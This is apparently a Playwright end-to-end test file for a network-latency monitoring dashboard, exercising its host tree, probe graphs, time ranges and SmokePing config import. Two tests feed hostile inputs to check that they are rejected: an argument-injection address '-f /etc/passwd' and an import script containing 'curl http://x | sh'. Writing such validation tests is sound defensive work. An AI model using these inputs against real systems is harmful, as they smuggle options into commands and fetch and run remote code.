// Dashboard: the host tree, probing, smoke graphs, ranges and the SmokePing
// import.
const { test, expect } = require("@playwright/test");
const { signedIn, field, confirm, watchConsole, settingsTab } = require("../helpers");

const SMOKEPING = `*** Targets ***
probe = FPing

+ Net
menu = Net
title = Network

++ dns
menu = Resolvers
title = Resolvers
host = 192.0.2.53

++ web
menu = Web
title = Web
host = www.example.com
`;

async function addNode(page, { kind, name, host, parentRow }) {
  if (parentRow) {
    await parentRow.hover();
    await parentRow.locator(`.trow-actions button[title="Add ${kind}"]`).click({ force: true });
  } else {
    await page.locator(".tree-head button", { hasText: "Add" }).click();
    await page.locator(".modal .seg button", { hasText: kind === "folder" ? "Folder" : "Host" }).click();
  }
  const modal = page.locator(".modal");
  await field(modal, "Name").fill(name);
  if (kind === "host") await field(modal, "Address (IP or hostname)").fill(host);
  await modal.locator("button", { hasText: "Create" }).click();
  await expect(page.locator(".toast.ok", { hasText: "Created" }).last()).toBeVisible();
  await expect(modal).toHaveCount(0);
}

const row = (page, name) => page.locator(".tree-row").filter({ has: page.locator(".tname", { hasText: new RegExp(`^${name}$`) }) });

test.describe("dashboard @e2e", () => {
  test("folders and hosts: create, nest, rename, delete", async ({ page }) => {
    await signedIn(page, "tree");
    const errors = watchConsole(page);
    await addNode(page, { kind: "folder", name: "Core" });
    await addNode(page, { kind: "host", name: "gw", host: "192.0.2.1", parentRow: row(page, "Core") });
    await addNode(page, { kind: "folder", name: "Branch", parentRow: row(page, "Core") });
    await expect(page.locator(".tree-row .tname")).toHaveText(["Core", "gw", "Branch"]);

    // rename the host
    await row(page, "gw").hover();
    await row(page, "gw").locator('.trow-actions button[title="Edit"]').click({ force: true });
    await field(page.locator(".modal"), "Name").fill("gateway");
    await page.locator(".modal button", { hasText: "Save" }).click();
    await expect(page.locator(".toast.ok", { hasText: "Saved" }).last()).toBeVisible();
    await expect(row(page, "gateway")).toHaveCount(1);

    // a host address is validated in the modal (server message shown inline)
    await page.locator(".tree-head button", { hasText: "Add" }).click();
    await field(page.locator(".modal"), "Name").fill("bad");
    await field(page.locator(".modal"), "Address (IP or hostname)").fill("-f /etc/passwd");
    await page.locator(".modal button", { hasText: "Create" }).click();
    await expect(page.locator(".modal .error-text")).not.toBeEmpty();
    await page.locator(".modal button", { hasText: "Cancel" }).click();

    // selecting the folder lists its hosts' charts; selecting a host shows its stack
    await row(page, "Core").click();
    await expect(page.locator(".chart-card")).toHaveCount(1);
    await row(page, "gateway").click();
    await expect(page.locator(".chart-card")).toHaveCount(4);
    await expect(page.locator(".chart-card .label").first()).toHaveText("gateway");

    // delete the folder: everything below goes with it
    await row(page, "Core").hover();
    await row(page, "Core").locator('.trow-actions button[title="Delete"]').click({ force: true });
    await expect(page.locator(".modal")).toContainText("All nested hosts and their history will be removed");
    await confirm(page, "Delete");
    await expect(page.locator(".toast.ok", { hasText: "Deleted" }).last()).toBeVisible();
    await expect(page.locator(".tree-empty")).toBeVisible();
    // the refused address above is the one 400 the browser logs
    expect(errors.filter((e) => !/status of 400/.test(e))).toEqual([]);
  });

  test("a host is probed and its smoke graph draws", async ({ page }) => {
    await signedIn(page, "probe");
    const prof = await page.request.post("/api/profiles", { data: { name: "Rapid", interval_s: 5, ping_count: 3, packet_size: 56, is_default: false } });
    expect(prof.ok()).toBeTruthy();
    await page.reload();
    await page.locator(".tree-head button", { hasText: "Add" }).click();
    const modal = page.locator(".modal");
    await field(modal, "Name").fill("loopback");
    await field(modal, "Address (IP or hostname)").fill("127.0.0.1");
    await field(modal, "Probe profile").selectOption({ label: "Rapid (5s · 3p · 56B)" });
    await modal.locator("button", { hasText: "Create" }).click();
    await expect(page.locator(".toast.ok", { hasText: "Created" }).last()).toBeVisible();
    await row(page, "loopback").click();
    await expect(page.locator(".chart-card .desc-inline").first()).toHaveText("3 pings / 5s · ICMP");

    // the prober picks the host up and writes its first cycle
    await expect.poll(async () => (await (await page.request.get("/api/status")).json()).length, { timeout: 45_000, message: "no probe cycle stored" }).toBeGreaterThan(0);
    // a window ends at the current second; a cycle stored in that very
    // second belongs to the next refresh
    await page.waitForTimeout(1500);
    await page.locator(".seg button", { hasText: "1h" }).click();
    const first = page.locator(".chart-card").first();
    await expect(first.locator(".chart canvas")).toBeVisible();
    await expect(first.locator(".lg-loss-stats")).toContainText(/cycles with loss \d+\/[1-9]/);
    await expect(first.locator(".lg-rtt")).toContainText("Median RTT");
    // health dot in the tree turns from "no data" to a loss colour
    await expect.poll(async () => row(page, "loopback").locator(".hdot").evaluate((e) => e.style.background), { timeout: 20_000 }).toMatch(/^rgb\(/);

    // ranges, live mode and the classic look switch without errors
    const errors = watchConsole(page);
    for (const r of ["6h", "24h", "7d", "max"]) {
      await page.locator(".seg button", { hasText: new RegExp(`^${r}$`) }).click();
      await expect(page.locator(".seg button.active")).toHaveText(r);
    }
    await page.locator(".pill", { hasText: "Live" }).click();
    await expect(page.locator(".pill.on", { hasText: "Live" })).toBeVisible();
    await page.locator(".pill", { hasText: "Old style" }).click();
    await expect(first).toHaveClass(/classic/);
    await expect(first.locator(".sp-legend")).toContainText("ICMP Echo Pings");
    await page.locator(".pill", { hasText: "Old style" }).click();
    await page.locator(".pill", { hasText: "Live" }).click();
    expect(errors).toEqual([]);
  });

  test("custom range needs a valid From/To", async ({ page }) => {
    await signedIn(page, "range");
    await page.request.post("/api/nodes", { data: { kind: "host", name: "h1", host: "192.0.2.10" } });
    await page.reload();
    await row(page, "h1").click();
    await page.locator(".pill", { hasText: "Custom" }).click();
    const pop = page.locator(".range-pop");
    await expect(pop).toBeVisible();
    await field(pop, "From").fill("2026-01-02T10:00");
    await field(pop, "To").fill("2026-01-01T10:00");
    await pop.locator("button", { hasText: "Apply" }).click();
    await expect(page.locator(".toast.err", { hasText: "valid From / To" }).last()).toBeVisible();
    await field(pop, "To").fill("2026-01-03T10:00");
    await pop.locator("button", { hasText: "Apply" }).click();
    await expect(pop).toBeHidden();
    await expect(page.locator(".pill.on", { hasText: "Custom" })).toBeVisible();
  });

  test("SmokePing import recreates the target tree", async ({ page }) => {
    await signedIn(page, "import");
    await settingsTab(page, "Import");
    await page.locator("textarea").fill(SMOKEPING);
    await page.locator(".card button", { hasText: "Import" }).click();
    await expect(page.locator(".toast.ok", { hasText: "Imported 1 folders and 2 hosts" }).last()).toBeVisible();
    await page.goto("/#/dashboard");
    await expect(page.locator(".tree-row .tname")).toHaveCount(3);
    const tree = await (await page.request.get("/api/tree")).json();
    expect(tree).toHaveLength(1);
    expect(tree[0].kind).toBe("folder");
    expect(tree[0].children.map((c) => c.host).sort()).toEqual(["192.0.2.53", "www.example.com"]);

    // a script is refused before anything is written
    await settingsTab(page, "Import");
    await page.locator("textarea").fill("#!/bin/sh\ncurl http://x | sh\n*** Targets ***\n+ a\nhost = 10.0.0.1\n");
    await page.locator(".card button", { hasText: "Import" }).click();
    await expect(page.locator(".card .error-text")).not.toBeEmpty();
    expect((await (await page.request.get("/api/tree")).json())).toHaveLength(1);
  });
});
